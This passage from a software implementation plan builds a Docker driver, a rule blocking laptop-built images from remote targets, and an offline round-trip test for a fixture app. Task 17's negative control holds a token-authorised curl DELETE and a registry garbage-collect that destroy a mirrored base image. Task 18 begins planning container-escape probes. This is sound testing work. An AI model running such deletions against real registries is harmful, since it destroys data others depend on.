  routing: RoutingDeps
  limits?: BuildLimits
}

export async function createDockerDriver(options: DockerDriverOptions): Promise<Driver> {
  const { engine } = options
  const limits = options.limits ?? DEFAULT_BUILD_LIMITS
  const queue = createBuildQueue(limits)
  // Read once at construction: it is a property of the daemon, not of a call, and
  // re-reading it per container would make `capabilities()` async.
  const host = await detectHostCapabilities(engine)

  return {
    name: 'docker',

    async buildImage(src: SourceRef, spec): Promise<ImageRef> {
      const repository = `local/${spec.projectSlug}`
      return queue.run(spec.projectSlug, async () => {
        const workDir = await mkdtemp(join(tmpdir(), 'mf-build-'))
        const contextDir = await assembleContext({
          repoPath: src.repoPath,
          commitSha: src.commitSha,
          blueprintDir: options.blueprintDir,
          workDir,
        })
        // §12: platform-mandatory, before anything is built. A gate that runs after
        // the build has already let the malicious postinstall run.
        const findings = await runMandatoryGates(contextDir, { lockfile: 'package-lock.json' })
        if (findings.length > 0) {
          throw new BuildGateError(
            findings,
            'These gates are platform-mandatory and cannot be waived (§12). Remove the secret, ' +
              'or commit the lockfile, and push again.',
          )
        }

        const buildId = `${spec.projectSlug}-${src.commitSha.slice(0, 8)}-${Date.now().toString(36)}`
        const credential = issueBuildCredential(options.buildCredentialSecret, {
          repository,
          buildId,
          expiresAt: Date.now() + limits.timeoutMs + 60_000,
        })
        const { digest } = await withEphemeralBuilder(engine, buildId, limits, (builder) =>
          runBuildxBuild({
            builder,
            contextDir,
            imageRef: `${options.registryHost}/${repository}:${src.commitSha.slice(0, 12)}`,
            registryToken: credential.password,
            registryHost: options.registryHost,
            timeoutMs: limits.timeoutMs,
          }),
        )
        // §12: an SBOM per build, retained with the Release; the staleness travels
        // with it. A blocked scan throws; a stale one does not (Task 12).
        const scan = await scanImage(engine, `${options.registryPublicHost}/${repository}@${digest}`)
        if (scan.blocked) {
          throw new EngineError('BUILD_SCAN_BLOCKED', scan.reason, 'Update the dependency and rebuild.')
        }
        return { repository: `${options.registryPublicHost}/${repository}`, digest }
      })
    },

    async ensureService(binding: ServiceBinding): Promise<ServiceHandle> {
      const kind = kindFromServiceName(binding.name)
      await ensureAppNetwork(engine, binding.projectSlug, kind)
      return ensureServiceContainer(engine, binding, kind, options.masterSecret)
    },

    async ensureInstance(spec: InstanceSpec): Promise<InstanceHandle> {
      await ensureAppNetwork(engine, spec.projectSlug, spec.environmentKind)
      const proxy = await ensureEgressProxy(engine, {
        slug: spec.projectSlug,
        kind: spec.environmentKind,
        allow: spec.egressAllow,
      })
      const hostname = options.hostnameFor(spec.environmentKind, spec.projectSlug)
      const handle = await ensureInstanceContainer(engine, spec, {
        networkName: appNetwork(spec.projectSlug, spec.environmentKind),
        dnsServer: options.dnsServer,
        proxyUrl: proxy.url,
        hostname,
        diskQuotaEnforceable: host.diskQuota,
      })
      // The route is applied here, not by the caller: §21 makes the edge the only
      // way to reach the app, so an instance without a route is not deployed.
      await applyRoute(options.routing, {
        hostname,
        upstream: `${handle.name}:${spec.port}`,
        kind: spec.environmentKind,
      })
      return handle
    },

    stopInstance: (id) => stopInstanceContainer(engine, id),
    destroyInstance: (id) => destroyInstanceContainer(engine, id),
    destroyService: (id, opts) => destroyServiceContainer(engine, id, opts),
    status: (id) => instanceStatus(engine, id),
    logs: (id, opts: LogOpts): AsyncIterable<LogLine> => containerLogs(engine, id, opts),
    exec: (id, cmd, opts: ExecOpts): ExecStream => containerExec(engine, id, cmd, opts),

    async snapshotService(_id: string): Promise<SnapshotRef> {
      // §12's nightly production snapshots are a Phase 2 job. `capabilities()`
      // reports `supportsSnapshot: false`, and this throws rather than returning a
      // plausible-looking ref that nothing can restore.
      throw new EngineError(
        'DRIVER_UNSUPPORTED',
        'snapshotService is not implemented by the Docker driver',
        'capabilities().supportsSnapshot is false. Production backups land in Phase 2 (§12).',
      )
    },

    capabilities: () => dockerCapabilities(host),
  }
}

/** `serviceName` is `<slug>-<kind>-<declared>` (P2). The kind is the second field. */
function kindFromServiceName(name: string): InstanceSpec['environmentKind'] {
  for (const kind of ['sandbox', 'staging', 'production'] as const) {
    if (name.includes(`-${kind}-`)) return kind
  }
  throw new EngineError(
    'SERVICE_NAME_UNPARSEABLE',
    `cannot read an environment kind out of service name '${name}'`,
    'Service names come from runtime/driver.ts serviceName(project, environment, declared).',
  )
}
```

- [ ] **Step 4: Run the contract suite against real Docker**

```bash
pnpm test && pnpm test:docker
```

Expected: **the same 11 contract tests that pass against the fake driver now pass
against Docker**, plus 5 capability tests. This is §16's *"keeps the abstraction
honest rather than aspirational"*, and it is the moment the plan's claim becomes
checkable.

**If a contract test fails, read it before changing anything.** Two of them —
*"status of an unknown id is gone, never a throw"* and *"destroying an unknown
instance is a no-op"* — are implemented entirely by Task 1's 404 rule, and a failure
there means that rule was lost rather than that the contract is wrong.

- [ ] **Step 5: Prove the contract suite has teeth against this driver**

In `instances.ts`, make `ensureInstanceContainer` skip its `existing` branch — always
create — and re-run.

Expected: **FAIL** on *"ensureInstance is idempotent — the second call does not create
a second instance"* and on *"stopInstance hibernates rather than destroys"*. Restore.

Then, in `driver.ts`, delete `enforcesDiskQuota` from `dockerCapabilities`.

Expected: this does **not** reach a test — it fails to **compile**, because
`DriverCapabilities` requires it. That is Decision 4 working: the shared suite was not
edited, and the omission is caught earlier than a test could catch it.

- [ ] **Step 6: Wire it into the boot entry point**

**Without this step the plan builds a driver nothing uses.** P2's `src/index.ts`
carries the line *"P3 swaps this for the Docker driver. Nothing else in this file
changes"* — and until it is swapped, `buildServer` still receives
`createFakeDriver()`. That matters more than it sounds: Task 17's `make demo` would
then build nothing, route nothing, touch no daemon, and **pass**, because the fake
driver answers every call happily in memory. It is the project's own lesson —
*a green result is not evidence a control is in force* — pointed at the plan's own
acceptance criterion.

First, `packages/control-plane/src/config.ts` — three fields, beside the ones Tasks 9
and 13 add:

```ts
  /** §12 makes the resolver per-container: dnsmasq-A's address on the platform network. */
  dnsServer: string        // MANIFEST_DNS_SERVER, default '10.89.0.53'
  /** Task 6 derives every service credential from this by HMAC. */
  masterSecret: string     // MANIFEST_MASTER_SECRET
  dockerSocket: string     // MANIFEST_DOCKER_SOCKET, default resolveSocketPath()
```

Then `packages/control-plane/src/index.ts`:

```ts
import { buildServer } from './api/index.js'
import { db } from './db/index.js'
import { hostnameFor, loadConfig } from './config.js'
import { createDockerDriver } from './runtime/index.js'
import { createEngineClient } from './runtime/docker/index.js'
import { createCaddyClient } from './routing/index.js'
import { createLocalSourceDriver } from './source/index.js'
import { loadBlueprints } from './blueprints/index.js'

const config = loadConfig()

// Hoisted rather than constructed inline: Step 7 reads `driver.name` back, and the
// boot log is the only place the choice this file makes is observable.
const driver = await createDockerDriver({
  engine: createEngineClient({ socketPath: config.dockerSocket }),
  masterSecret: config.masterSecret,
  buildCredentialSecret: config.buildCredentialSecret,
  blueprintDir: config.blueprintsRoot,
  dnsServer: config.dnsServer,
  // These two are NOT interchangeable, and nothing fails loudly if they are
  // swapped: `registryHost` is what the BUILDER calls the registry (Task 9's
  // `registryInternalUrl`, reachable on the internal build network) and
  // `registryPublicHost` is what the DAEMON calls it. Same content, addressed by
  // digest. Swapped, builds push somewhere the daemon cannot pull from, and the
  // failure surfaces at `ensureInstance` as a pull error naming an image that
  // was, from the builder's point of view, pushed successfully.
  registryHost: config.registryInternalUrl,
  registryPublicHost: config.registryUrl,
  // P2's `hostnameFor` is `(config, kind, slug)`; the driver's option is
  // `(kind, slug)`. Config is bound here rather than threaded through the driver,
  // which has no other use for it.
  hostnameFor: (kind, slug) => hostnameFor(config, kind, slug),
  routing: {
    caddy: createCaddyClient(config.caddyAdminUrl),
    servers: config.caddyServers,
  },
})

const app = await buildServer({
  db,
  config,
  driver,
  source: createLocalSourceDriver(config.reposRoot),
  blueprints: await loadBlueprints(config.blueprintsRoot),
})

await app.listen({ port: config.port, host: '127.0.0.1' })

// Which driver actually booted is the one fact this file decides, and every
// acceptance in this plan is meaningless if it is 'fake'. One line, so the answer
// is observable rather than inferred from behaviour.
//
// `console.log`, NOT `app.log.info`. P2 builds the server as
// `Fastify({ logger: false })`, under which `app.log.info` exists, accepts the
// call, and writes nothing. Measured 2026-09-05: the line vanishes. This is a
// boot-time fact, printed once, before any request — it does not belong to the
// request logger P2 deliberately turned off.
console.log(JSON.stringify({ driver: driver.name, msg: 'control plane ready' }))
```

**`createDockerDriver` is `async` and `createFakeDriver` was not**, which is why this
file gains a top-level `await`: the driver reads the daemon's capabilities once at
construction (Step 3) rather than making `capabilities()` async on every driver that
will ever implement §11. The package is ESM, so top-level `await` needs no wrapper.

- [ ] **Step 7: Prove the wiring, not just the driver**

Boot the control plane and read which driver it came up with:

```bash
pnpm --filter @manifest/control-plane dev 2>&1 | tee /tmp/mf-boot.log &
sleep 5
grep -o '"driver":"[a-z]*"' /tmp/mf-boot.log
```

Expected: `"driver":"docker"`.

Then the negative control, which is the point of the step: put `createFakeDriver()`
back, restart, and re-run.

Expected: `"driver":"fake"` — and the control plane comes up perfectly happily,
serving every route, passing every unit test. That state is indistinguishable from
success at every level above this file, which is why it is asserted here rather than
assumed from a working `make demo`.

> **Corrected 2026-09-05.** This step used to be `grep -q '"driver":"docker"' && echo
> WIRED`, expecting *no match* as its negative control. Two things were wrong with
> it, and the second is the dangerous one. The line never printed at all, because it
> went through `app.log.info` under `logger: false` (fixed in Step 6). And
> **"expected: no match" cannot distinguish a fake driver from a missing log line** —
> it would have passed whether or not the swap worked, on the single assertion this
> plan's own self-review identified as its worst defect. Grepping for the *value*
> and reading it back fails loudly in both directions.

- [ ] **Step 8: Commit**

```bash
git add packages/control-plane/src/runtime/docker/driver.ts \
        packages/control-plane/src/runtime/docker/index.ts \
        packages/control-plane/src/runtime/docker/driver.docker.test.ts \
        packages/control-plane/src/runtime/docker/capabilities.test.ts \
        packages/control-plane/src/runtime/index.ts \
        packages/control-plane/src/config.ts \
        packages/control-plane/src/index.ts
git commit -m "feat(runtime): the Docker driver passes P2's contract suite unchanged

driver-contract.ts is imported byte-for-byte as P2 wrote it. Verified by breaking
ensureInstance's idempotency and watching two named contract tests fail.

The boot entry point now constructs it instead of the fake driver, verified by
reading driver:docker back from the boot line, and driver:fake after putting
createFakeDriver() back — without that swap every later acceptance in this plan
passes against an in-memory driver."
```

---

## Task 16: §13's promotion rules — the `local/` namespace and the remote-target refusal

**Files:**
- Create: `packages/control-plane/src/releases/promotion.ts`
- Modify: `packages/control-plane/src/releases/index.ts`
- Test: `packages/control-plane/src/releases/promotion.test.ts`

**Interfaces:**
- Consumes: `Driver`, `ImageRef` from `runtime/`; **`ReleaseError` from `releases/release.ts` (P2 Task 16)**.
- Produces:
  - `LOCAL_NAMESPACE = 'local/'`
  - `isLocallyBuilt(image: ImageRef): boolean`
  - `assertPromotable(driver: Driver, image: ImageRef): void` — throws `ReleaseError`

> **Corrected 2026-09-05, after P2 executed. This task must REPLACE a check, not add
> one.** P2's `deployRelease` already refuses a `local/` image on a remote-target
> driver, and `releases.test.ts` already asserts
> `code: 'RELEASE_LOCAL_IMAGE_ON_REMOTE_DRIVER'` against it. What P3 adds that is
> genuinely new is `isLocallyBuilt` — P2 compares a prefix on the whole repository
> string, which is wrong the moment the registry host is part of it, and the builder
> and the daemon call that host different names.
>
> So: extract the check into `promotion.ts`, keep **P2's error class and P2's code**,
> and have `deployRelease` call the extracted function instead of its inline
> comparison. P2's existing test then still passes unchanged, which is the point.
>
> The original version of this task introduced a new `PromotionError` with
> `code = 'IMAGE_NOT_PROMOTABLE'`. Two things would have gone wrong. Thrown *before*
> P2's check it shadows it and P2's test fails on the code; thrown *after* it is
> dead. And `toErrorResponse` has no branch for a `PromotionError`, so it would have
> left the API as **500 INTERNAL** — the exact defect P2 Task 17 hit twice, once for
> the dev-auth errors and once for `ZodError`.

**S1 left this open: *"§21's honest divergence 4 says laptop images are never
promoted, but nothing in the driver enforces that yet. A P3 decision."*** It is
decided here, and it is enforced.

**§13 scopes the rule to the *driver*, not the environment kind**, and the reasoning
is worth restating because the obvious rule is wrong: *"A laptop's own staging
environment runs on the local Docker driver and accepts `local/` images — which is
what makes the Phase 1 journey possible offline. Attaching the rule to 'staging and
production' would have forbidden the only image a laptop can produce."*

So: an image in the `local/` namespace may be deployed by any driver whose
`capabilities().remoteTarget` is `false`, and by no driver whose `remoteTarget` is
`true`. Developer laptops are arm64 and UBC infrastructure will be x86-64, and
*"promote the exact digest"* makes an architecture mismatch unresolvable at deploy
time rather than at build time — which is the failure this refusal exists to move
earlier.

**And it is tested against the fake driver, in the Docker-free tier.** Flipping one
capability flag is the whole test, which means the rule protecting UBC infrastructure
is exercised on a laptop that has no UBC infrastructure and in milliseconds. This is
§16's fake-driver argument paying off in a place it was not obviously going to.

- [ ] **Step 1: Write the failing test**

`packages/control-plane/src/releases/promotion.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import { createFakeDriver } from '../runtime/index.js'
import { ReleaseError } from './release.js'
import { assertPromotable, isLocallyBuilt } from './promotion.js'

const localImage = { repository: '127.0.0.1:7107/local/chem-labs', digest: `sha256:${'a'.repeat(64)}` }
const ciImage = { repository: 'registry.ubc.ca/manifest/chem-labs', digest: `sha256:${'b'.repeat(64)}` }

describe('§13: images built on a laptop never reach UBC infrastructure', () => {
  it('recognises the local namespace wherever the registry host sits', () => {
    expect(isLocallyBuilt(localImage)).toBe(true)
    expect(isLocallyBuilt({ ...localImage, repository: 'manifest-registry:5000/local/x' })).toBe(true)
    expect(isLocallyBuilt(ciImage)).toBe(false)
  })

  it('lets a LOCAL driver deploy a local image — this is what makes §1 work offline', () => {
    const driver = createFakeDriver({ capabilities: { remoteTarget: false } })
    expect(() => assertPromotable(driver, localImage)).not.toThrow()
  })

  // THE RULE. One flag, and the same image becomes unpromotable.
  it('REFUSES a local image on a driver that targets somewhere else', () => {
    const driver = createFakeDriver({ capabilities: { remoteTarget: true } })
    expect(() => assertPromotable(driver, localImage)).toThrow(ReleaseError)
    try {
      assertPromotable(driver, localImage)
    } catch (error) {
      expect((error as ReleaseError).code).toBe('RELEASE_LOCAL_IMAGE_ON_REMOTE_DRIVER')
      // The message has to explain the architecture problem, because the person
      // reading it will otherwise try to force it.
      // ReleaseError has no separate `hint` field; the reasoning is in the message.
      expect((error as ReleaseError).message).toMatch(/arm64|architecture|CI/i)
    }
  })

  it('lets a remote driver deploy a CI-built image', () => {
    const driver = createFakeDriver({ capabilities: { remoteTarget: true } })
    expect(() => assertPromotable(driver, ciImage)).not.toThrow()
  })

  // The rule is about the DRIVER, not the environment kind. A laptop's own
  // production environment is still the local driver, and still allowed.
  it('says nothing about the environment kind', () => {
    const driver = createFakeDriver({ capabilities: { remoteTarget: false } })
    expect(() => assertPromotable(driver, localImage)).not.toThrow()
    expect(assertPromotable.length).toBe(2)
  })
})
```

- [ ] **Step 2: Run it to make sure it fails**

```bash
pnpm --filter @manifest/control-plane test src/releases/promotion
```

Expected: FAIL — `Cannot find module './promotion.js'`.

- [ ] **Step 3: Write it**

`packages/control-plane/src/releases/promotion.ts`:

```ts
import type { Driver, ImageRef } from '../runtime/index.js'

/** Everything the local Docker driver builds lands here (§13). */
export const LOCAL_NAMESPACE = 'local/'

// promotion.ts imports ReleaseError from its sibling: `import { ReleaseError } from
// './release.js'`. Same module, so §5's boundary rule is not in play.

// No new error class. P2's ReleaseError already carries this refusal, its code is
// already in the API's 409 family via toErrorResponse, and releases.test.ts already
// asserts it. A second class here would either shadow P2's check or be dead code,
// and would surface as 500 because toErrorResponse would not recognise it.
export { ReleaseError } from './release.js'

/** The registry host varies — the builder and the daemon call it different names — so
 *  the namespace is matched on the path, not on the whole repository string. */
export function isLocallyBuilt(image: ImageRef): boolean {
  const path = image.repository.includes('/')
    ? image.repository.slice(image.repository.indexOf('/') + 1)
    : image.repository
  return image.repository.startsWith(LOCAL_NAMESPACE) || path.startsWith(LOCAL_NAMESPACE)
}

/**
 * §13, and the reason it is scoped to the DRIVER rather than to the environment
 * kind: "A laptop's own staging environment runs on the local Docker driver and
 * accepts `local/` images — which is what makes the Phase 1 journey possible
 * offline. Attaching the rule to 'staging and production' would have forbidden the
 * only image a laptop can produce."
 */
export function assertPromotable(driver: Driver, image: ImageRef): void {
  // ReleaseError, and P2's code. See the correction note at the top of this task:
  // P2 already refuses this and already has a test naming that code.
  if (!driver.capabilities().remoteTarget) return
  if (!isLocallyBuilt(image)) return
  throw new ReleaseError(
    'RELEASE_LOCAL_IMAGE_ON_REMOTE_DRIVER',
    `image ${image.repository}@${image.digest.slice(0, 19)}… was built locally and cannot be ` +
      `deployed by the '${driver.name}' driver, which targets remote infrastructure. ` +
      'Developer laptops are arm64 and UBC infrastructure is x86-64, and §13 promotes the exact ' +
      'digest — so an architecture mismatch is unresolvable at deploy time. Everything that ' +
      'leaves a laptop is built by CI on the target architecture.',
  )
}
```

**Replace** P2's inline check in `deployRelease` (`releases/release.ts`) with a call
to `assertPromotable(driver, { digest, repository })`, immediately before the driver
is asked to do anything, and export it from `releases/index.ts`. Delete the inline
`if (driver.capabilities().remoteTarget && repository.startsWith('local/'))` block it
supersedes — leaving both means two checks racing to throw different errors for the
same condition.

`releases.test.ts`'s *"refuses a local/ image on a driver that declares a remote
target"* must still pass **unchanged**. If it does not, the extraction changed the
error type or the code, and that is a defect in this task rather than in P2's test.

- [ ] **Step 4: Run the tests**

```bash
pnpm test
```

Expected: PASS — 5 promotion tests, in milliseconds, with no Docker, **plus P2's
existing `releases.test.ts` still green**, including the one that names
`RELEASE_LOCAL_IMAGE_ON_REMOTE_DRIVER`. That test passing after the extraction is
the check that this task replaced P2's guard rather than shadowing it.

- [ ] **Step 5: Prove the refusal is the flag**

Change `if (!driver.capabilities().remoteTarget) return` to `return` unconditionally.

Expected: **FAIL** on *"REFUSES a local image on a driver that targets somewhere
else"*, and on nothing else. Restore.

- [ ] **Step 6: Commit**

```bash
git add packages/control-plane/src/releases/promotion.ts \
        packages/control-plane/src/releases/promotion.test.ts \
        packages/control-plane/src/releases/release.ts \
        packages/control-plane/src/releases/index.ts
git commit -m "feat(releases): enforce §13's local/ namespace rule against remote targets

S1 left this open: the divergence was documented and nothing enforced it. Tested
against the fake driver by flipping one capability flag."
```

---

## Task 17: The fixture app, and P3's demo — a bare repo to a healthy URL, offline

**Files:**
- Create: `fixtures/fixture-app/package.json`
- Create: `fixtures/fixture-app/package-lock.json`
- Create: `fixtures/fixture-app/src/index.js`
- Create: `packages/control-plane/src/runtime/docker/roundtrip.docker.test.ts`
- Modify: `Makefile` (`make demo`)
- Modify: `docs/superpowers/RUNBOOK.md`

**Interfaces:**
- Consumes: everything. This is the task that proves the plan.
- Produces: `make demo`, and a Docker-tier test that runs the same path headlessly.

**The roadmap specifies this app** (*"P3's build target. Trivial by design: a health
endpoint and one route that writes to Mongo. No auth, no AI, because P3 has
neither"*), and **§16's proof app is a different, larger thing that lands in P4.**
Building the proof app here would need CWL and LiteLLM, which is why this one is
deliberately smaller.

**The demo's bar is the roadmap's: a fixture app healthy at a `manifest.internal`
URL, from a clean checkout, offline.** "Offline" is the part that is easy to fake —
a build that works because the daemon happened to have the base image cached is not
an offline build, and S1 found exactly that. So Step 5 turns the network off at the
Docker level and runs it again, and the test asserts the **shape** of the answer: a
`boots` counter that rises across a stop/start is evidence the volume survived, where
a `200` is only evidence something answered.

**`boots` is the assertion that matters.** S1 used it for the same reason: it proves
the bound database is real, the volume persisted, and the app actually wrote to it.
`{"status":"ok"}` proves none of those.

- [ ] **Step 1: Write the fixture app**

`fixtures/fixture-app/src/index.js`:

```js
// P3's build target. Trivial on purpose: a health endpoint and one route that
// writes to its own Mongo. No auth and no AI — those are P4's proof app.
// It contains NO Dockerfile: D13 makes the build definition the blueprint's, and
// this repository exists partly to prove an app cannot supply one.
import { createServer } from 'node:http'
import { MongoClient } from 'mongodb'

const port = Number(process.env.PORT ?? 8080)
const client = new MongoClient(process.env.MONGODB_URI ?? 'mongodb://127.0.0.1:27017')
let boots = 0

const server = createServer(async (req, res) => {
  try {
    if (req.url === (process.env.MANIFEST_HEALTH_PATH ?? '/healthz')) {
      // The health endpoint asserts the DATABASE too. A health check that only
      // says "the process is up" reports healthy for an app that cannot serve.
      await client.db(process.env.MONGODB_DB_NAME ?? 'app').command({ ping: 1 })
      res.writeHead(200, { 'content-type': 'application/json' })
      res.end(JSON.stringify({ status: 'ok', mongo: true }))
      return
    }
    const db = client.db(process.env.MONGODB_DB_NAME ?? 'app')
    await db.collection('boots').insertOne({ at: new Date() })
    res.writeHead(200, { 'content-type': 'application/json' })
    res.end(
      JSON.stringify({
        app: process.env.MANIFEST_PROJECT_SLUG ?? 'fixture-app',
        env: process.env.MANIFEST_ENV ?? 'unknown',
        url: process.env.MANIFEST_APP_URL ?? '',
        uid: process.getuid?.() ?? -1,
        // Rises on every request. A rising counter across a stop/start is evidence
        // the volume survived; a 200 is evidence that something answered.
        boots: await db.collection('boots').countDocuments(),
      }),
    )
  } catch (error) {
    res.writeHead(500, { 'content-type': 'application/json' })
    res.end(JSON.stringify({ status: 'error', message: String(error) }))
  }
})

await client.connect()
boots += 1
server.listen(port, '0.0.0.0', () => console.log(JSON.stringify({ level: 'info', msg: 'listening', port })))
```

`fixtures/fixture-app/package.json`:

```json
{
  "name": "fixture-app",
  "private": true,
  "type": "module",
  "dependencies": { "mongodb": "6.12.0" }
}
```

Generate the lockfile against **the mirror**, not the public registry, so `make seed`
has warmed exactly what the build will ask for:

```bash
cd fixtures/fixture-app
npm install --package-lock-only --registry http://127.0.0.1:7108/
```

- [ ] **Step 2: Turn the fixture into a bare repository**

Add to the `Makefile`:

```make
## demo: build the fixture app from a bare repo and serve it at a manifest.internal URL
demo: up
	@bash scripts/demo.sh
```

`scripts/demo.sh` creates `.manifest/repos/fixture-app.git` from `fixtures/fixture-app`
(a `git init` plus `git clone --bare`, idempotent), calls the control plane's build and
deploy routes with `curl`, and prints the resulting URL. It is a thin wrapper: the
logic under test lives in the Docker-tier test below, so that the demo and the test
cannot drift into proving different things.

- [ ] **Step 3: Write the round-trip test**

`packages/control-plane/src/runtime/docker/roundtrip.docker.test.ts`:

```ts
import { execFile } from 'node:child_process'
import { promisify } from 'node:util'
import { afterAll, beforeAll, expect, it } from 'vitest'
import { instanceName, serviceName } from '../driver.js'
import { describeDocker } from './docker-tier.js'
import { dockerDriverForTests, fixtureBareRepo } from './testing.js'

const run = promisify(execFile)
const SLUG = 'fixture-app'
const KIND = 'staging' as const

/** From a container, through the edge: the control plane cannot reach app IPs. */
async function fetchThroughEdge(path: string): Promise<Record<string, unknown>> {
  const { stdout } = await run('docker', [
    'run', '--rm', '--network', 'manifest-platform', '--dns', '10.89.0.53',
    'curlimages/curl:8.11.1', '-sS', '-m', '10',
    `https://${SLUG}.staging.manifest.internal${path}`,
  ])
  return JSON.parse(stdout) as Record<string, unknown>
}

describeDocker('P3 acceptance: bare repo to a healthy manifest.internal URL', () => {
  let driver: Awaited<ReturnType<typeof dockerDriverForTests>>
  let repo: { repoPath: string; commitSha: string }
  let service: { id: string; name: string; endpoint: string }

  const specFor = (image: { repository: string; digest: string }) => ({
    name: instanceName(SLUG, KIND, 'r1'),
    projectSlug: SLUG,
    environmentKind: KIND,
    releaseId: 'r1',
    image,
    env: {
      MANIFEST_ENV: KIND,
      MANIFEST_PROJECT_SLUG: SLUG,
      MANIFEST_APP_URL: `https://${SLUG}.staging.manifest.internal`,
      PORT: '8080',
      MONGODB_URI: service.endpoint,
      MONGODB_DB_NAME: 'app',
    },
    port: 8080,
    healthPath: '/healthz',
    resources: { cpu: 0.5, memoryMi: 256, pids: 128, diskMi: 1024 },
    services: [service],
    egressAllow: [],
  })

  beforeAll(async () => {
    driver = await dockerDriverForTests()
    repo = await fixtureBareRepo()
  }, 120_000)

  afterAll(async () => {
    await driver.destroyInstance(`mf-${instanceName(SLUG, KIND, 'r1')}-app`)
    await driver.destroyService(`mf-${serviceName(SLUG, KIND, 'db')}`, { deleteData: true })
  })

  it('builds from a bare repo at a commit and yields a digest', async () => {
    const image = await driver.buildImage(repo, { blueprintRef: 'fixture-node@1', projectSlug: SLUG })
    expect(image.digest).toMatch(/^sha256:[0-9a-f]{64}$/)
    expect(image.repository).toContain('local/fixture-app')
  })

  it('provisions Mongo, starts the app, routes it, and serves it over trusted TLS', async () => {
    const image = await driver.buildImage(repo, { blueprintRef: 'fixture-node@1', projectSlug: SLUG })
    service = await driver.ensureService({
      name: serviceName(SLUG, KIND, 'db'), type: 'mongo', version: '7',
      environmentId: 'env-1', projectSlug: SLUG,
    })
    const handle = await driver.ensureInstance(specFor(image))
    expect(handle.url).toBe(`https://${SLUG}.staging.manifest.internal`)

    // No -k. The certificate has to actually verify (S7's trust in three places).
    const { stdout } = await run('docker', [
      'run', '--rm', '--network', 'manifest-platform', '--dns', '10.89.0.53',
      'curlimages/curl:8.11.1', '-sS', '-o', '/dev/null',
      '-w', '%{ssl_verify_result} %{http_code}',
      `https://${SLUG}.staging.manifest.internal/healthz`,
    ])
    expect(stdout.trim()).toBe('0 200')

    const health = await fetchThroughEdge('/healthz')
    // The SHAPE of the answer. `{status:'ok'}` alone would pass with no database.
    expect(health).toEqual({ status: 'ok', mongo: true })
  })

  it('runs non-root, and its data survives a stop and start', async () => {
    const before = (await fetchThroughEdge('/')) as { boots: number; uid: number }
    expect(before.uid).not.toBe(0)

    const id = `mf-${instanceName(SLUG, KIND, 'r1')}-app`
    await driver.stopInstance(id)
    expect((await driver.status(id)).state).toBe('hibernated')

    // Waking through ensureInstance is the same call that created it (§11).
    const image = await driver.buildImage(repo, { blueprintRef: 'fixture-node@1', projectSlug: SLUG })
    await driver.ensureInstance(specFor(image))
    const after = (await fetchThroughEdge('/')) as { boots: number }
    // Rising, not merely present: this is the evidence the volume survived.
    expect(after.boots).toBeGreaterThan(before.boots)
  })
})
```

- [ ] **Step 4: Run it**

```bash
make up && pnpm test:docker
```

Expected: 3 round-trip tests green, and `ssl_verify_result` of `0` — the certificate
verifies without `-k`.

- [ ] **Step 5: Run it OFFLINE, which is the actual bar**

```bash
docker network disconnect bridge manifest-verdaccio 2>/dev/null || true
# Cut the daemon off from the internet the way S1 did: rebuild with the mirror and
# the builder both egress-blocked. `make verify` already asserts both denials.
make verify | grep -i 'NEGATIVE CONTROL'
pnpm test:docker
```

Expected: the build still succeeds, because `make seed` **pushed** the base image into
the local registry rather than merely pulling it (S1's finding, and §21 now says so).

**Then the control**: take the mirrored base image out of the local registry and run
the build again. `registry:2` deletes by digest, so read the digest back first.

```bash
TOKEN=$(node infra/seed/mint-token.mjs base/node)
DIGEST=$(curl -sSI -H "Authorization: Bearer $TOKEN" \
  -H 'Accept: application/vnd.oci.image.index.v1+json' \
  -H 'Accept: application/vnd.docker.distribution.manifest.list.v2+json' \
  http://127.0.0.1:7107/v2/base/node/manifests/22-alpine \
  | tr -d '\r' | sed -n 's/^[Dd]ocker-[Cc]ontent-[Dd]igest: //p')
echo "removing base/node@$DIGEST"
curl -sS -X DELETE -H "Authorization: Bearer $TOKEN" \
  "http://127.0.0.1:7107/v2/base/node/manifests/$DIGEST"
docker exec manifest-registry registry garbage-collect /etc/docker/registry/config.yml
pnpm test:docker
```

Expected: **FAIL** with `failed to resolve source metadata for …/base/node`. Restore
with `make seed`.

Two things about this control. The `Accept` headers are required — without them the
registry answers with the v2 schema and returns a **different digest** from the one
the manifest is stored under, so the `DELETE` returns 404 and the control silently
does not run. And `REGISTRY_STORAGE_DELETE_ENABLED=true` must be set on the registry
service in `infra/compose.yaml`; without it the `DELETE` answers `405` and, again,
nothing is removed. **A control that quietly did nothing is worse than no control**:
the build would still succeed and you would conclude the offline path was proven.

Without this, a build that succeeded because the daemon had the image cached is
indistinguishable from one that succeeded because the mirroring worked — which is
precisely the mistake S1 made once, in the other direction, with the npm registry.

- [ ] **Step 6: Record it in the runbook**

Add to `docs/superpowers/RUNBOOK.md`: `make demo`, what it produces, the URL, and the
offline procedure above with its control. State the exact versions the run was made
against — a finding without a version is not reproducible.

- [ ] **Step 7: Commit**

```bash
git add fixtures/ scripts/demo.sh Makefile \
        packages/control-plane/src/runtime/docker/roundtrip.docker.test.ts \
        packages/control-plane/src/runtime/docker/testing.ts \
        docs/superpowers/RUNBOOK.md
git commit -m "test: P3 acceptance — bare repo to a healthy manifest.internal URL, offline

Asserts a rising boots counter across a stop/start, not a 200: the counter is
evidence the bound database and its volume are real."
```

---

## Task 18: S6 — the probe matrix, and §16's security-regression tier

**Files:**
- Create: `packages/control-plane/src/runtime/docker/s6.docker.test.ts`
- Create: `docs/superpowers/spikes/S6-findings.md`
- Modify: `docs/superpowers/plans/2026-08-29-plan-roadmap.md` (the ledger)

**Interfaces:**
- Consumes: the running platform and a deployed fixture app (Task 17).
- Produces: a probe matrix, a findings note, and a permanent test tier.

**S6 runs here because the roadmap says so** (gap 4): *"run before 1a, S6 has nothing
to test; run before Phase 3, its findings arrive after the container model is
already load-bearing. S6 runs as P3's acceptance exercise, against the real Docker
driver… its probes become §16's security regression tier, and any probe that reaches
is a defect P3 must fix before the plan is done."*

**The question S6 answers:** *what can a hostile process inside an app container
actually reach?* Not what the configuration says it can reach.

**Every probe needs a negative control**, and for these the control is the same shape
each time: **run the identical probe from an ordinary bridge-network container and
show it succeeds.** A probe that fails because the target is down, the image lacks
the tool, or the timeout is too short looks exactly like a probe that fails because
the control works.

**Two probes are deferred, and named so nobody thinks they were forgotten:**

- **`app or sandbox → LiteLLM's admin routes`** is enforced per key with
  `allowed_routes` (§10, §12, S3), and keys are **P4's**. §16 lists it in this tier,
  so P4 adds it here with the negative control S3 specifies — *"a key minted without
  it is the negative control"*.
- **`sandbox` isolation specifically.** P3 builds no sandbox environment; §11 gives
  sandboxes `exec`, a wider egress baseline and session-scoped AI keys, none of which
